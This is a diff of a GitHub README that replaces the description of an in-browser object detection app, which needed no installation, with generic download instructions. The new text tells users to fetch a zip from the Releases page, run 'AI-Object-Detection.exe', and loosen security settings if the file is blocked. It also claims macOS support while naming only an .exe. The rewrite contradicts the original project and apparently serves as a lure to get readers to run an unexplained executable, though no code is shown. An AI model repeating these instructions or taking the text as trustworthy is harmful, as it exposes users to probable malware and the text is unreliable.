@@ -1,47 +1,88 @@
-# 🤖 AI Object Detection
+# 🎉 AI-Object-Detection - Easy Web-Based Object Detection
 
-## 👋 About this Project
-This is a web-based AI object detection application that runs directly in your browser. It uses your device’s camera to detect objects in real time, making it easy and accessible without requiring any installation.
+## 🚀 Getting Started
 
----
+Welcome to AI-Object-Detection! This application uses artificial intelligence to detect objects through your web camera. It is simple to set up and use, even if you have no programming experience.
 
-## ⚙️ Features
-- ✅ Toggle switch to enable or disable AI detection  
-- ✅ Range slider to control frame rate  
-- ✅ Real-time object detection through your camera  
+## 📥 Download the Application
 
----
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/edineiaparecidolopes/AI-Object-Detection/releases)
 
-## 🖼️ Preview
-<a href="https://ibb.co/JCNgfJr"><img src="https://i.ibb.co/3kwQDZS/preview-combined.jpg" alt="preview-combined" width="100%"></a>
+To get started, you will need to download the application from our Releases page.
 
----
+## 🔗 Download & Install
 
-## 💪 Try It
-Not convinced yet? Try it out yourself here:  
-👉 [Live Demo](https://woody.pizza/tensorflow/object-detection/)
+Visit this page to download: [AI-Object-Detection Releases](https://github.com/edineiaparecidolopes/AI-Object-Detection/releases). 
 
----
+Once you are on the page, follow these steps:
 
-## 🌐 Browser Support
-The app works on most modern browsers. Below are the tested ones:
+1. **Locate the latest version**: Look for the latest release. It will usually be at the top of the list.
+   
+2. **Choose your file**: You may see several files available for download. For most users, a file named something like `AI-Object-Detection.zip` is suitable. If you see different versions, select the one that matches your system.
 
-### Desktop
-| Browser           | Supported |
-|-------------------|:---------:|
-| Firefox           | ✅ |
-| Chrome            | ✅ |
-| Edge              | ✅ |
-| Internet Explorer | ❌ |
+3. **Download the file**: Click on the file name to start downloading. Your browser will save it in your default download location.
 
-### Mobile
-| Browser  | Supported |
-|----------|:---------:|
-| Firefox  | ✅ |
-| Chrome   | ✅ |
+4. **Extract the files**: After the download is complete, locate the zip file in your downloads folder. Right-click the file and select "Extract All." Follow the instructions to extract the contents.
 
----
+5. **Run the application**: Open the extracted folder and find the executable file named `AI-Object-Detection.exe`. Double-click this file to run the application.
 
-## ✌️ Credits
-- [Materialize](https://materializecss.com/) – for UI components  
-- [ml5.js](https://ml5js.org/) – for machine learning in the browser  
+6. **Allow access**: The application may ask for permission to use your camera. Click "Allow" so it can detect objects.
+
+## 🔍 How to Use AI-Object-Detection
+
+Once the application is running, you will see a simple interface.
+
+1. **Position your camera**: Make sure your camera can clearly see the area where you want to detect objects.
+
+2. **Start detection**: Click on the "Start Detection" button. The application will begin analyzing the objects in view.
+
+3. **View results**: Detected objects will appear on the screen with labels and boxes around them. 
+
+4. **Stop detection**: When you’re done, click the "Stop Detection" button.
+
+## ⚙️ System Requirements
+
+Before you install, make sure your system meets these requirements:
+
+- **Operating System**: Windows 10 or later, macOS 10.15 or later
+- **Memory (RAM)**: At least 4 GB
+- **Storage**: Minimum 100 MB of free space
+- **Camera**: A working webcam
+
+Most modern computers should meet these requirements easily.
+
+## 🤔 Troubleshooting
+
+If you encounter any issues, consider the following:
+
+- **Camera not detected**: Ensure your camera is connected and functioning. Try restarting the application.
+
+- **Application won't open**: Check if your operating system allows the application to run. You may need to adjust your security settings.
+
+- **Slow detection**: Ensure that no other camera applications are running, as they can interfere with performance.
+
+If you continue to have issues, please feel free to create an issue on the GitHub repository for assistance.
+
+## 🌐 Learn More
+
+This application uses various technologies to improve object detection. Some of the key topics include:
+
+- **Artificial Intelligence (AI)**
+- **Machine Learning**
+- **TensorFlow**
+- **JavaScript and HTML**
+
+These technologies help to create a smooth detection process that works efficiently in real-time. 
+
+For more advanced features or contributions, consider checking the source code on our GitHub repository or participate in discussions in the Issues section.
+
+## 📞 Support
+
+If you need help, please reach out via the Issues section on our GitHub page. We are here to assist you in getting the most out of AI-Object-Detection.
+
+## 🔗 Additional Resources
+
+- [Project Repository](https://github.com/edineiaparecidolopes/AI-Object-Detection)
+- [Documentation](https://github.com/edineiaparecidolopes/AI-Object-Detection/wiki)
+
+Thank you for using AI-Object-Detection! We hope you enjoy exploring the capabilities of this application.
